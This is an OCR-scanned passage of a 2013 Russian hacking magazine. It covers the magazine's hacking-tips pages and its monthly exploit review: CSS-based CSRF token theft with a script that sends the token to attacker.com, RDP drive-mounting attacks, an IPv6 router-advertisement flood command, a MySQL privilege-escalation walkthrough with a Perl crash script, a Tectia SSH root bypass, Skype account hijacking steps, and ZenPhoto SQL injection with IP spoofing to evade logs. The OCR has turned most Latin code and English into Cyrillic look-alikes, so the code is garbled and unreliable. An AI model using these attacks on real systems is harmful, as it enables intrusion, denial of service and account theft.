теряем, так как получаем необходимость выполнять уже кроссдо- 
менные запросы и сталкиваемся с Бате Огідіп Роіісу... В других же 
браузерах все хорошо работает :). 

Хотелось бы еще отметить, что вся эта крутость была почерп- 
нута у Билли Риоса (ВіІІу Ріоз) с улетного блога ( доо.дІ/сІМХМб ). Ему 
уважение и благодарности от нас :). 



ТЬі$ І5 а 8І? Гііе 



ТЬе $аше П1е і* аізо а РОР :) 



оігчгор-акгаоі» 



в, Ьпр7/рОЬа».»рр$роісотЛоо-о^-0^«і'/Солг*т-ітоддііг>д ИітІ - Просмотр исходного ю 



Файл Правка Формат 



. 1 о і в ШІ 



<Ьса1> 

<Ъойу> 

<Ы> 

РОГ Зтиддііпд 

</Ы> 

<ЪгхЬг> 

<ЬЗ> 

ТЫ* 19 а ді.1 (Не 

</ЬЗ> 

<1тд эгс-"Ьсср : //рбГхаэ . аррэрос . соа/5оп-оГ-СіГаг/ЫоіАР0Г. дІГ" 
ЬеідЬс-10 місІсЬ«10Х/Іжд> 

<ЬгхЬгхЪг> 

<ЬЭ> 

ТЬе эвіг.е Піе Іа аіао а РОГ :) 

</ЪЗ> 

соЬЭесс Оаса-"Ьсср://рОГхээ. аррэрос. сот/ Зоп-оГ-біГаг/'ЛосАРОГ.діГ" 
суре - "арр11сасіоп/р<іГ" м1йсЬ-"500" ЪеідЬс«"500"х/оЬЗесс> 

</Ъобу> 

</Ьсж1> 



Рис. 2. В зависимости от того, как мы обращаемся к файлу, браузер обрабатывает 
его по-разному 




ПОЛУЧИТЬ ДАННЫЕ С ПОМОЩЬЮ С55 



ЗАДАЧА 



РЕШЕНИЕ 

Давай представим себе веб-приложение, в котором все хорошо. 
Страшные символы фильтруются, а на все важные операции требует- 
ся токен (в качестве защиты от С5РР), да и с остальным все в поряд- 
ке. И казалось бы, здесь нам особо не подкопаться. Однако пути есть. 



Если мы можем влиять на контент какой-то страницы и вста- 
вить в нее вроде бы нестрашные символы кривых скобок ({ }), 
а страница эта содержит токен, то мы можем украсть его. Не знаю, 
насколько описание получилось понятным, так что вот пример — 
РНР-скрипт на атакуемом сервере (іпсіех.рЬр): 



ХАКЕР 01 /168/2013 



053 




ВЗЛОМ/ ЕА5УНАСК 



<И1:іп1> 

<ТіТІе>ѵісТіт</1:і*1е> 

<ЬосІу> 

<рх?рНр ргіпі: бИег($_СЕТ[ 'х* ]); ?></р> 

<-Рогт> 

<іпри! 1уре="1:ех1" пате="орега1:іоп"х/іприТ> 

< іприі: 1:уре="I^іс^сIеп ,, пате=Чокеп">111111122222</іпри1:> 
</Тогт> 

</ЬосІу > 

</Ы:т1> 

Здесь предположим, что функция КІІег фильтрует основные 
опасные символы (’’<>). А токен для показательности представлен 
в виде статического значения. Наша цель — получить токен, чтобы 
обойти защиту от С5РР; тогда мы могли бы провести какую-то 
страшную операцию. 

Решение данной задачи может быть даже более чем простым. 
Суть идеи заключается в том, что мы можем выдать эту атакуемую 
страницу за СББ-стиль, подгрузить его на свою страницу и полу- 
чить к нему доступ из ЗаѵаБсгірІ. Основывается эта идея на двух 
вещах. Во-первых, мы можем инжектировать в приложение свои 
данные; таким образом мы можем объявить свой стиль внутри 
страницы. Например, так: 

ІіТТр://ѵісТіт.сот/іпгіех.рІір?х={}*{-РопТ--Рагпі1у: ' 

Во-вторых, правила парсинга браузерами С55 очень гуманны, 
а потому браузеры пропускают все лишнее (например, НТМЬтеги) 
и подгружают лишь интересующие их объявления стилей. То есть 
если мы разместим у себя на веб-сервере специальную страницу 
с указанием С55 на атакуемый нами скрипт сервера: 

<ТіТ1е>аТ1аскег</-Сі-СІе> 

<1іпк ге1="5І:у1е5ЬееТ" ЬгеТ="Н«р://ѵіс1:іт.сотЛ-< 
іпгіех.рЬр?х={}*{Топ*-Таті1у: ' " Туре= , Чех-С/с55 ,, > 

<ЬосІу> 

и заманим на нее нашу жертву, то браузер жертвы попытается 
подгрузить стиль, подгрузит его и получит примерно следующее 
значение для {опЫатіІу: 

Топіі-Татііу : </рх-Рогт> < іприі: Туре='ЧехТ” 
пате=”орегаТіоп ,, х/іпри'Ь<іпри-1: Туре^’НісІсІеп" «-• 
пате=”1океп м >111111122222</іпри1:>... 

Но что еще круче, мы можем вынуть это значение, просто 
обратившись к «сІоситепІ.Ьосіу.сиггепіБіуІеЛопіРатіІу» через 




Полный вектор атаки с одного домена 



.ЛаѵаБсгірІ. То есть в нашу специальную страницу требуется доба- 
вить следующий код, чтобы переслать данные из {опМатіІу: 

<5СГІрТ> 

сІоситеп1:.ѵ\»гі1:е( *<іт§ $гс=ІгСТр://а«аскег.сот/^ 
ааааа ? ' +езсаре(с1оситеп1: . Ьосіу . сиггепТБТуІе . -Роп*Раті1у 

</5СГІр*> 

Итак, обобщу пример. Мы загоняем пользователя на нашу 
страницу на нашем домене. Его браузер видит ссылку на С55 
на атакуемом сервере и подгружает все, что идет после опреде- 
ления ’ЧопЫатіІу:". После чего мы можем прочитать это значение 
с помощью ЗаѵаБсгірІ и вынуть интересующий нас токен :). По сути, 
у нас тут нарушение Бате Огідіп Роіісу. 

Ну а теперь немного о грустном. Хотя способ и крутой (уязвимы 
к нему просто миллионы сайтов), но с неких пор он недействите- 
лен. Причина в том, что прошаристые безопасники навели паники 
пару лет назад и разработчики браузеров прикрыли вектор. 
Теперь, по идее, запрещено использовать СББ’ки с других до- 
менов, хотя, если посмотреть на трафик, запрос на загрузку С55 
происходит... 

Здесь, думаю, стоит отметить, что в контексте одного домена 
все работает отлично (хотя толку от этого не очень много). Так 
что считай эту задачку просто примером и основой для размыш- 
ления. 



ИСПОЛЬЗОВАТЬ КОР ДЛЯ НАПАДЕНИЯ 



ЗАДАЧА 



РЕШЕНИЕ 

Появление любой технологии сулит чаще всего и новые специфи- 
ческие проблемы. Конечно, микрософтовские службы терми- 
налов — штука совсем не новая, даже бородатая и во многом 
секьюрная. Тем не менее использовать ее в «злых» целях может 
быть очень даже интересно. Итак, предположим, что злоумыш- 
ленник должен атаковать какую-то корпоративную сеть, а точнее, 
ее пользователей. 

РРР (в широком смысле этого сокращения) позволяет поль- 
зователям удаленно работать на хосте, используя нативный 
графический интерфейс. Но как можно атаковать пользователей, 
обладая доступом к РОР-серверу? Самый простой вариант лежит 



в возможности автоматического монтирования дисков и устройств 
клиента при подключении к РОР-серверу. То есть при подключе- 
нии юзера к РОР-серверу диски как бы расшариваются для РОР- 
сервера и у него появляется возможность залить на клиент любые 
файлы в любое место (в зависимости от прав юзера в своей ОС, 
разумеется). Конечно, по умолчанию диски не монтируются, 
но здесь есть некоторые тонкости. 

Во-первых, через стандартный РОР-клиент (тзІ 5 с) нет воз- 
можности задавать, при подключении к какому серверу монтиро- 
вать диск, а к какому — нет. Там используются общие настройки 
для всех подключений. Таким образом, достаточно часто получает- 
ся, что администраторы ходят на РйР по серверам с подключенны- 



054 



ХАКЕР 01 /168/2013 




Хакерские секреты простых вещей 



ми дисками, и это создает прекрасную основу для атаки. По сути, 
нужно захватить контроль над одним из серверов и тем или иным 
образом заставить админа зайти на него, а далее только профит 
собирай, так как админская тачка уже в наших руках. 

Во-вторых, можно насильно включить опцию подключения 
дисков — за счет указания соответствующих настроек в РйР- 
файлах. И это рождает несколько иной вектор атаки — атаку 
на безумных офисных пользователей. Суть заключается в том, 
что злоумышленник может создать такой РОР-файл, при запуске 
которого у пользователя ничего спрашиваться не будет, а авто- 



матически произойдет подключение к РРР-серверу с автомонти- 
рованием дисков и последующим захватом контроля пользова- 
тельской тачкой. Конечно, здесь потребуется проявить немного 
социальной инженерии. Например, можно разослать офисным 
работникам письма с приложенными РйР'шками и просьбой их 
запустить для тестирования какой-то новой системы. Такие файлы 
не вызовут подозрения у офисного народа, и, я уверен, большин- 
ство выполнит необходимые действия. 

Видеопримеры можно посмотреть у \Л/іскесІ СІоѵѵп, там же при- 
мер ЬаСничка для заливки «шелла» — доо.дІ/ШѴх . 



ОТКАЗ В ОБСЛУЖИВАНИИ ЧЕРЕЗ ІРѴ6 



ЗАДАЧА 



РЕШЕНИЕ 

ІРѵб идет нам навстречу достаточно большими шагами. Конечно, 
его сильно подталкивают из-за заканчивающихся мест в ІРѵ4, 
но с учетом того, как мир неохотно меняется и какие есть пробле- 
мы с обратной поддержкой, шаги и правда гигантские. К примеру, 
у большинства современных сетевых систем уже по умолчанию 
включен ІРѵб-стек. 

И в подтверждение сегодняшней общей темы, ІРѵб также не- 
сет новые возможности, но с ними и новые векторы атак, и новые 
уязвимости. Как простейший пример можно вспомнить ситуацию, 
когда есть некий файрвол, который осуществляет правильную 
фильтрацию. Проблема в том, что фильтрация происходит только 
для ІРѵ4, а в то же время ІРѵб обделена каким-то вниманием. 

И значит, злоумышленник может проводить все свои атаки, просто 
перейдя на ІРѵб-адресацию. В общем, мы, как атакующая сторона, 
можем только порадоваться новшеству. 

Но давай перейдем к нашей задаче. Несколько лет назад 
ресерчеры из разных стран начали усердно копать ІРѵб и накопали 
пучок различных багов. Одним из таких стала сногсшибатель- 
ная штука — ІСМРѵб Роиіег Аппоипсетепіз Яоогі (хех, при виде 
такого названия вспоминается начало 2000-х с вуп-флудом, Іапгі 
и Іеаггігор'ами). 

Роиіег Аппоипсетепіз в легальных целях используется 
для того, чтобы, когда к подсети подключился новый роутер, он мог 
бы обозначить свое появление другим хостам. Типа: «я такой-то 
и отвечаю за такую-то подсетку». И все хосты, получив такой пакет, 
обновляют свои таблички маршрутизации, добавляя новые дан- 
ные. Кроме этого, РА может быть использована для некой замены 
ЭНСР. И когда в ОС установлена возможность автоматического 
получения ІР, при получении РА ОС также будет пытаться получить 
ІР-адрес в новой подсетке. 

Ну, я думаю, что, прочитав данную информацию, ты уже до- 
гадываешься, в чем суть атаки. Как я уже говорил, большинство 
ОС по умолчанию имеют включенный ІРѵб, а также поддерживают 
автоматическое получение настроек. Таким образом, для атаки 
нам требуется послать в подсеть много рандомных РА-пакетов, 
и хосты, получая их, будут обновлять таблицы маршрутизации. 

Но самое страшное в том, что на обновление их уходит очень много 
ресурсов и в итоге ОС перестает нормально работать. К примеру, 

ОС ѴѴіпгіоѵѵз поедает всю память и занимает все процессорное вре- 
мя. Пишут, что аналогичная ситуация есть с РгееВБО и со старыми 
Ыпих'ами, а также с сетевыми девайсами .Іипірег и Сізсо! Причем 
тот же Майкрософт сообщил, что они не будут патчить эту «дырку». 
Вероятно, это связано с тем, что для закрытия дырки нужно от- 
казаться от поддержки РА или фильтровать их как-то, а тогда полу- 
чается отклонение от стандартов, что совсем нехорошо. В общем, 
для атакующего выглядит и звучит все это шикарно. 

Теперь практика. И здесь все просто :). Народ из ТНС разрабо- 
тал набор тулз, нацеленных на ІРѵб, включающий в себя и РА- 



флудер Ідоо.дІ/ОЫѵуЩ . Таким образом, нам всего лишь надо скачать 
тулзы и выполнить команду (для ВаскТгаск): 

Лоос1_гои*ег6 е1Р0 

где еіЬО — интерфейс, куда посылать пакеты. 

Кстати, перед проведением атаки не забудь защитить и себя — 
пакеты ведь широковещательные, а потому обрабатываются всеми 
девайсами в сети, так что давай немного поговорим о защите от РА 
для ѴѴіпсІоѵѵз. Конечно, самое простое решение — отключить ІРѵб. 
Но можно и просто отключить поддержку РА-пакетов следующей 
командой: 

пеІзЬ іпТег-Расе ірѵб $еТ іпгег-Расе "І_оса1 Агеа — 
СоппесТіоп" гоиТегдізсоѵегу=сІІ5аЫесІ 

Стоит еще отметить и то, что из-за опасности атак стали появ- 
ляться различные штуки для защиты от РА (ІоосГа. Например, доо. 
дІ/гОЕѴЛ/а . Но и для них уже придумали пути обхода — в основном 
за счет манипуляций фрагментацией пакетов. 

Вообще, техника реально убийственна — «кладется» все 
и в считаные секунды. Подробнее можно почитать здесь — 
доо.дІ/ЮоОк . 

Вот и все. Надеюсь, что было интересно :). Успешных ресерчев 
и познаний нового! 




Пара секунд, и все виндовые хосты в подсети упали :) 



ХАКЕР 01 /168/2013 



055 







ВЗЛОМ/ОБЗОР ЭКСПЛОЙТОВ 



Сергей Белов І5егдеуЬеІоѵе.ги) 
Павел Александрович Ііѵіпзісіе.ЫодзроІ.сот) 




ми 



Вся информация предоставлена исключительно в ознакоми- 
тельных целях. 

Ни редакция, ни автор не несут ответственности за любой 
возможный вред, причиненный материалами данной статьи. 

Месяц эксплойт-бума! О-бау гуляют в паблике, 
приватные эксплойты становятся более 
доступными! Сегодня в выпуске: Ехріоіі Магкеі, 

Му5С!І_ (ШАѴз, ТесТіа Зегѵег, Зкуре, 2епрЬоІо. 

Обзор 

ЭКСПЛОИТОВ 



АНАЛИЗ СВЕЖЕНЬКИХ УЯЗВИМОСТЕЙ 



рг Ехріоіі Магкеі от ІпіЗсІОг на сайте 1337сіау. 
!■ сот 




ІЫ/А 






И/АІ 











Дата релиза: ноябрь 2012 
Автор: 1337гіау.сот 

В ноябре этого года команда Іп]ЗсШгна своем проекте 1337сІау.сот 
выкатила новую фичу — покупку/продажу приватных эксплойтов. 
Система довольнодоступная, цены пока некусаются — в районе 
5-200долларов. 

БЗЗЕД 

Само появление магазина эксплойтов довольно ожидаемо. 
1337гіау.сот и аналоги (например. ехрІоіі-сіЬ.сот ) — публичны. 
Приват обходит эти сайты стороной или появляется наних на мно- 
го позже, а это ведь самое лакомое! Итак, про саму систему. Теперь 
у каждого у пользователя есть «гол д», который можно или купить 
(1 доісі = 1$), или заработать в этомже магазине, продавая свои 
эксплойты. При выводе берется нехилая комиссия — 30%, мини- 
мальная сумма к выводу — 1000 золотых. Изданный момент самый 
дорогой в магазине — сплоит для известной ЮББпогІотюзера 
ХіапигО — стоит 220 золотых. Одна из самых интересных фишек 
в нем — НТТР ріреііпіпд, который может привести к йо5. Хотя кто 
знает, что именно автор реализовал в других возможностях сплои- 
та (І_Р/СРІ_РЬура55, ІІРІ_Епсосіе, БпогіРиІезапаІугегитакдалее)? 



СѴ55Ѵ2 То! 



( А V : N / А С : М /А С) : Б / С : Р/ 1 : Р/ А : Р ) 

ГПІЫ^ 

Дата релиза: 2 декабря 2012 
Автор: Кіпдсоре 
СѴЕ: 2012-5613 

Повышение привилегий в Му5С1І_черезтриггеры. 

Благодаря хакеру Кіпдсоре этот месяц оказался невероятно богат 
эксплойтами для Му5СИ_, хотя работоспобность некоторых из них 
стоитпод вопросом. Но начнем стого, чтодействительно работает 
и было протестированоуже многими. 

Результатом работы эксплойта является добавление пользо- 
вателя Му5СІІ_садминскими правами. Звучитзаманчиво? 

Итак, что нам нужно для атаки: 

1. Уже существующий юзер с ІіІе_ргіѵ. 

2. Возможностьсоздаватьфайлы в системе отпользователя 
"туздГ. 

3. Доступ ксозданиютриггеровутекущего юзера. Важный 
момент— триггеры выполняются, когдазаданная команда 
выполняется от нужного юзера. Втипичной работетриггеры 
МуБСІІ. вызываются с привилегиями того пользователя, который 
его создал. Но так как мы можем создать файл с произвольным 



Л 



056 



ХАКЕР иі /168/ 2013 



Обзор эксплойтов 



содержимым — мы имеем возможностьуказатьпроизвольного 
юзера для этоготриггера. 

4. Использование уже откопанного переполнения стека в одном 
из других эксплойтов. Это очень важно, нам необходимо любым 
способом крашнуть сервер, иначе триггер не будет признан сер- 
вером без его перезапуска. 



Разбор работы эксплойта. 

1. Подключаемся к серверу Му5СІІ_. 

2. Создаем таблицу гооіте для триггера. 

3. Создаем файл триггера /ѵаг/ПЬ/туздІ/<с]аІаЬа5епате>/гооІте. 
ТР6. 

4. Крашим сервер. После перезапуска наштриггер будет распознан 
сервером. 

5. Добавляем новуюзаписьвтаблицу, чтобы наштриггервыпол- 
нился. 

6. Триггер выдаетвсе праватекущемуподключенному юзеру 
втаблице тузді.изег. 

7. Снова крашим Му5СІ1_ для загрузки новой конфигурации юзера. 

8. Создаем нового юзера с полными правами. 

9. Снова крашим сервердля релоада текущей конфигурации. 

10. Подключаемся под новым юзером. 

11. Новый юзер имеет доступ ко всем базам данных! 

12. Дампим значения хешей паролей из таблицы тузді.игег, что яв- 
ляетсязнакомуспешной работы эскплойта. 

13. Наслаждаемся полным доступом;) 



Огасіе оспаривает данную уязвимость, заявляя, что все в по- 
рядке, и всесами виноваты, раз неследуютинструкциям поуста- 
новке Му5СІІ_. Ана ютубеуже можно найти видео, демонстрирую- 
щее использование данной баги. 



Му50І_5.1-5.5. 

ИЛВПГ.Я 

Исправление изданный моментотсутствует 

■ Му501_ (Ыпих) 51аск Ьазегі ЬиМег оѵеггип 



СѴ55Ѵ2 6.Э 



[М±/АС:иьи:Ы/С:Ы/\:Ш:С) 

ШШ 

Дата релиза: 2 декабря 2012 
Автор: Кіпдсоре 
СѴЕ: 2012-5611 

А вот и еще одна находка от Кіпдсоре — она использовалась в экс- 
плойте выше. Переполнение стека при выдаче прав (при созда- 
нии) пользователю. 



Посмотрим на код эксплойта, он не слишком замороченный: 

изе зТгісТ; 
изе ОВІ( ) ; 

# Подключение к базе данных 

ту $сІЬЬ = ОВІ->соппесТ("ОВІ :тузд1 ісІаТаЬазе^езТ;*-' 
ЬозТ=192 . 168 .2.3;", "изег", "зесгеТ",*-* 

{'КаізеЕггог' => 1}); 



$а ="А" х 100000; 

ту $зТЬ = $сІЫі->ргераге( ,, 8гап1 біе оп $а.* То 
‘изег’Хф’Х’ ісІепТібесІ Ьу '5есгеТ‘;"); 
$зТЬ->ехесиТе(); 




Приватный сплоит для 5погТ МиІІірІе НИР Вура55 



# Отключение от базы данных 

$ЬЬЬ->сИзсоппесТ(); 

Замечаем, что в имени базы данных передается строка длиной 
100 000 символов, которую не может обработать сервер МуЗСП. 
Получаем краш. Взглянем на дамп памяти: 

тузд1@1іпих-1зсІ2:/гооТ> есІЬ -с /ѵаг/НЬ/тузяІ/соге 
ЗД| §ЬЬ (СЭВ) 51І5Е (7. 2-3.3) 

Соругі§ЬТ (С) 2010 Ргее Бо-РТиаге РоипсІаТіоп, Іпс. 

Нсепзе СРІ.ѴЗ+: СШ СРІ ѵегзіоп 3 ог ІаТег. 

ТЬіз із -Ргее зо-РТмаге: уои аге -Ргее То сЬап§е апЬ гесііз 
ТгіЬиТе ІТ. 

ТЬеге із N0 ЫАККАМТѴ, То ТЬе ехТепТ регтіТ 

ТесІ Ьу Іам. Туре "5Ьом соруіп§" апсі "зЬоы маггапТу" -Рог 

сІеТаіІз. 

Міззіп§ зерагаТе ЬеЬи§іп-Ро -Рог ТЬе таіп ехесиТаЫе біе 
Тгу: гуррег іпзТаІІ -С ”ЬеЬи§іп-Ро(Ьиі1сІ-ісІ)=.-< 
УбВЫЪеаВаЬШІсіЪЗМІЪЗіѴМвЪбдІбВвЗ” 

[Мем ТЬгеасІ 8801] 

[№м ТЬгеасІ 8789] 

[Меы ТЬгеасІ 8793] 

[№м ТЬгеасІ 8791] 

[ІУІем ТЬгеасІ 8787] 

[№* ТЬгеасІ 8797] 

[№м ТЬгеасІ 8798] 

[№м ТЬгеасІ 8785] 

ТЬгеасІ 8796] 

[Ыем ТЬгеасІ 8783] 

Соге маз еепегаТесІ Ьу Уизг/ІосаІ/тузяІ/Ьіп/туздІсі^ 
--1о§=/Ттр/тузд1сІ.1о§’ . 

Рго§гат ТегтіпаТеЬ иіТЬ зібпаі 11, БеетепТаТіоп баиІТ. 

#0 0x41414141 іп ?? () 

(8СІЬ) 

Замечаем наши символы Ах 100000(414141...). Вданном эксплойте 
переполнение стека просто крашит сервер, но это может привести 
и к выполнению произвольных команд. 

ттсшн 

Му5СІІ_5.1-5.5. 

шшш 

Официальных заявлений нет, в багтрекерахтикеты активны. 

Но при тестировании на 5.1.66 эксплойт не отработал. 



ХАКЕР 01 /168/2013 



057 






ВЗЛОМ/ОБЗОР эксплойтов 



Тесііа 55Н Ц5ЕК АІЛН СНапде Кециезі 
Ра55ѵѵог(1 Реве» ѴиІпегаЬіІіІу 



СѴББѴ2 9.3І 



(АѴ:Ы/АС:М/Аи:Ы/С:С/І:С/А:С] 

[ДЗШ 

Дата релиза: 5 декабря 2012 
Автор: Кіпдсоре 
СѴЕ: 2012-5975 

Это просто вин. Тесііа — это коммерческое решение отОрепББН. 
Эксплойт используетуязвимость, которая позволяетудаленно 
сбросить пароль рута, а после — авторизоваться без пароля. 

При включенном режиме «оИ-БІуІе» авторизации существует баг, 
который сбрасывает пароль уже созданному юзеру и, соответ- 
ственно, позволяетпод ним авторизоваться. Если используется 
«пеѵѵ-зіуіе» авторизация, то заюзать багу не представляется 
возможным. Авторизация в интерактивном режиме, через 6ББАРІ 
и по ключу не подвержена данной атаке. 

ДЕНИ 

Тесііа Бегѵегб. 0.4-6. 0.20, 6.1.0-6.1.12, 6.2.0-6.2.5 и 6.3.0-6.3.2. 

ШШШ 

Доступно обновление с исправлением данной ошибки от произво- 
дителя. 

Угон любого 
аккаунта 5куре 



ІІЧ/А 10.0І 



|:1:1І=ІД 

В этом месяце еще неплохо погремела уязвимость на сайте Бкуре, 
позволяющая угнать любой аккаунт, зная только е-таіі жертвы. 

На данный моментуязвимостьзакрыта, но разберем ее. Бага при- 
мечательна тем, что изначально ее позиционировали как фичу:]. 

Бкуре проповедуетследующую религию: кодномуемейлумо- 
жетбыть привязано несколько логинов для входа. Идея не самая 
лучшая и вообще довольно смутная, но используем ее в своих 
целях. 

1. Регистрируем новый аккаунт, указав е-таіі нужного аккаунта. 

2. Авторизуемся подлогином/паролем, который мытолькочто ука- 
зали на шаге 1. 



3. Запрашиваем сброс пароля на сайте скайпа. 

4. И воттутсамый важный момент. Ссылка для изменения пароля 
приходит не только на почту, но и в сам клиент скайпа! 

5. Переходим по ссылке, которая пришла в скайп, и вбиваем маркер 
пароля. 

6. Выбираем основной логин для данной почты и меняем пароль. 

7. Аккаунтугнан! 

Те, кто пробовал использовать эту уязвимость, очень часто 
сталкивались с тем, что к ним не приходил маркер пароля (то есть 
они кликали на него, а там — пусто). Надо было просто на главной 
странице (уже в клиенте) скайпа нажимать Р5, дойти до инфы про 
фейсбук, закрыть ее, итам будет маркер :). 

Сейчас ошибка исправлена, на шаге 4 маркер в клиент больше 
не приходит, а приходиттолько на почту. 

ШШШ 

Бкуре пофиксили багу. 

# Множественные 
° уязвимости в 2епрНо1о 



ІЧ/А Ы/АІ 



Ы/А 

Дата релиза: 3 ноября 2012 
Автор: ЭапекѴіпсі«ѵѵагахе» 

СѴЕ: Ы/А 

2епрЬоІо — СМ5, предназначенная для мультимедийных сайтов, 
поддерживаетаудио-, видео- и фотоматериалы. Также есть 
модуль блога, новостей, кастомных страниц и т. п. Уязвимости, 
найденные в ней, довольно интересны. Если это зді-іп], то это 
не простая подстановка в Р05Т/6ЕТ, а крафт параметров. 

БоикиЕстюм в функции сетуберірп 

ТипсТіоп §еТІ)5егІР() { 

ІІ (І5$е1:($_5ЕКѴЕК[ ’НТТР_Х_РОКМАКОЕО_РОК ’ ] ) ) { 

геТигп 5апіТІ2е($_5ЕКѴЕК[ , НТТР_X_РОКМАР^Е^_РОК , ] , 0); 

} еізе { 

геТигп 5апіТІ2е($_5ЕКѴЕК[ ' КЕМОТЕ_АООК 1 ] л 0); 

Итак, разберемся. Еслиустановлензаголовок НТТР_Х_ 
РОРѴ\/АРОЕО_РОР (обычно выставляется при использовании 
прокси-серверов), то он принимается за ІР-адрес. А что с функцией 
запіІігеО? Она нам не помеха, ее роли: 

1) резатьслеши,еслилпадіс_диоІе5_дрс=оп; 





гоосѲсіеЪіап: -/орепззЬ-5 . Ер28 ,/ззЬ -1гоос 20874^ИІИ5 
Раззѵогсі АисЬепсісасюп: 
гоос'з раззѵогсі: 

Раззѵогсі АисЬ.епсісасюп: 
гоос'з раззѵогсі: 

Раззѵогсі Аисііепсісасюп: 
гоос'з раззѵогсі: 

Ег.сег гоот@206. ■■■■ 'з оісі раззѵогсі: 

Епсег тооШог. ШШШЛ 'з пеѵ раззѵогсі: 

Ресурс гост @2 08 НИИИ ^ ' з пеѵ раззѵогсі: 

Іазс Ходіп: Зип Лиі 03 2011 13:38:41 -0400 Ггоіг. рБсі^^^НИ^ННН .пес 
[гоосЕсрадр дсѵОЗ -]* ипаясс -а;ісі; 

Ьхпих С] Іа.п 2 . 6 . 9-78 . 0.22 .ЕЬзгср #1 5МР ТЛи Арг 30 19:14:39 ЕОТ 2009 і686 1686 іЗвб СШ/ІЛпих 

иісі-0 (гоос) оісІ-0 (гоос) дгоирз-0 (гоос) , 1 (Ът) ,2 (сіаетсп) , 3 (эуз) , 4 (айгс) , 6 (сіізіс) , 10 (ѵ^ееі) 



РоСдляуязвимостивТесІіаЗегѵег 



058 



ХАКЕР П /168/ 2013 






Обзор эксплойтов 



2) резать нулл-байты; 

3) резать НТМІ_-теги. 

То есть она предназначена для защиты отХ55. Но на нужные 
нам кавычки для 50Ып]есІіоп никак не влияет. Копаем дальше: 

ТипсТіоп Раі1есІ_ассе55_Ь1оскег_асІтіпСа1:е($а11ом, $раее) { 

$зд1 = ’ ІМБЕКТ ІІѴТО ' .ргебх( ' р1иеіп_5І:ога§е ' ) 

' ("Туре", "аих’Ѵ'сІаІа") ѴАШЕ5 ("-Раі1есІ_ассе55", ^ 

" * .Тіте() . ' ' .деШзегІРО . ' ; 

Яиегу($зя1); 

соипТ = сІЬ_соип1:( ’р1и§іп_5Тога§е’ ,*-* 

' ІлІНЕРЕ , Туре , ="-Раі1ес1_ассе55" А№ ^ 

■раТа^" ' .§е1:1)5егІР() . * "* ); 

Выполняется запрос в базу данных, где конкатенацией подстав- 
ляется результатфункции деШзегІРО. Мы можем провести 5СИ-іп], 
используя параметр НТТР_Х_Р0ВѴ\/АВ0Е0_Р0В. Скрафтитьсвой 
новый параметр в запросе — плевое дело! Для этого мы можем ис- 
пользоватьхотьТеІпеІ:). Но все же пойдем цивилизованным путем. 
Например, при помощи аддона ТатрегОаІа. 

1 Открываем админ-панель Ьир://ІосаІЬозІ/2епрбоІо1433/2р-соге/ 
асІтіп.рЬр. 

2. Запускаем ТатрегсіаЫБіагіТатрег). 

3. Пытаемся залогиниться с левыми данными, у нас выскакивает 
окноТатрегОаІа. 

4. "ТатрегѵѵіІЬ гедиез*?" -> "Татрег"— внедряемся в запрос. 

5. , 7ШеІетепГ->Х_Р0РМР0Е0_Р0Р=\*аг"ахе — добавляем эле- 
мент. 

6. Жмем «ОК» и уже модифицированный запрос отправляем на сер- 
вер. 

Как результат, мы увидим пустую страницу (ОК200 гезропзе собе, 
сопІепІІепдіЬШ.Ноеслимы посмотрим "сіеЬид.Іод", то увидим: 

Васк^гасе: ІІ5ЕК ЕККОК: МуБяІ Еггог: - 
( <ет>ІМ5ЕКТ ІМТО ’ [ргебх]р1иеіп_зТогаее ' «-• 

(’Чуре", "аих”, "РаТа") ѴАШЕ5 ("■Еаііес^ассезз", — 
" 1349792737 ", ,, маг"ахе")</ет> ) ТаіІеР. Му5р1 геТигпеР ІИе 
еггог <ет>Ѵои Иаѵе ап еггог іп уоиг 5(21. зупТах; сЬеск *Не 
тапиаі ^ИаТ соггезропРз Іо уоиг Му5(21_ зегѵег ѵегзіоп Тог 
Тбе гіебТ зупТах То изе пеаг 'ахе")' 

Наша БОЬинъекция :) деШзегІРтакже вызывается в файле гр-соге/ 
2р-ехІеп5Іопз/5еагсЬ_5ІаІІ5Ііс5.рЬр и используется похожим об- 
разом: 

зТаТіс ТипсТіоп бапР1ег($зеагсИ_51:аТ15Т1с5, $1:уре, 
$зиссе55, $сІупатіс, $іТегаТіоп) { 

$зд1 = ' ІМБЕКТ INТО ' . ргебх( ' р1иеіп_зТога§е ' ) 

• ("Туре", "аих", "РаТа") ѴАШЕ5 - 
("зеагсЬ_5ТаТІ5Тісз", " ' .§еТІ)зегІР( ) . ' ", «-■ 

' .РЬ_яиоТе(зегіа1І2е($зТоге)) . ' ) ' ; 

Яиегу($зя1); 

И здесь мы можем провести похожую 5СИ-инъекцию. 

СПУФИНГІР 

Используя багу функции деШзегІРО, мы можем просто подме- 
нятьсвой ІР где-нибудь в логах. Например, в файле гр-соге/гр- 
ехІепзіопз/зесигіІу-Іоддег.рЬр, название которого говоритсамо 
за себя, присутствуетследующийкод: 

зесигіТу_1о§§ег : : 1.о§§ег^ 

($зиссезз, $и5ег, $пате, §е-Шзег!Р(), ’Васк-епсГ, ^ 



ПОДМЕНИВ ІР НА КАКОЙ- 
НИБУДЬ ВАЛИДНЫЙ (С ТОЧКИ 
ЗРЕНИЯ ФОРМАТА) АДРЕС, МЫ 
НЕ СПАЛИМСЯ В СИСТЕМНЫХ 
ЛОГАХ СМ5 (НЕ ЗАБУДЬ, ЧТО 
ЕСТЬ ЕЩЕ ЛОГИ ВЕБ-СЕРВЕРА) 



$аиТИ, $разз); 
зесигіТу_1о§бег: :Ю§§ег- 

($5иссезз, $изег, $пате, §еТІ)зегІР( ), ’РгопТ-епР', «-* 
$аТИогіТу, $разз); 

зесигіТу_1о§§ег: :І_о§еег«-< 

(Таізе, $изег, $пате, §еТІ)зегІР(), ’ВІоскеР ассезз', — 

", $раее); 

зесигіТу_1о§§ег: :І_о§§ег-> 

(Таізе, $изег, $пате, §е-ШзегІР(), ’ВІоскеР аІЬиш', «-< 

", $ра§е); 

зесигіТу_1о§§ег: :1о§§ег— 

(Тгие, $и5ег, $пате, деШзегІРО, ’ изег_* .$с1азз, *-< 

' 2 р_аРтіп_аиТб ’ , $изегоЬ] - >§еТ1)зег( ) ) ; 

зесигіТу_1о§еег: :1_о§§ег^ 

(ТаІ5е, $изег, $пате, §еТІ)зегІР(), ’ХБКЕ ассезз 
ЫоскеР', $Токеп); 

зесигіТу_1о§§ег: :1.оееег«-- 

($а11ом, $изег, $пате, §еТІ)5егІР( ), $асТіоп, «-< 
’ 2 р_аРтіп_аиТИ’ , Ьазепате($1о§) ); 

зесигі1:у_1о§еег: :Ьо§§ег^-< 

($зиссезз, $изег, $пате, ееТЦзегІРО, «-< 

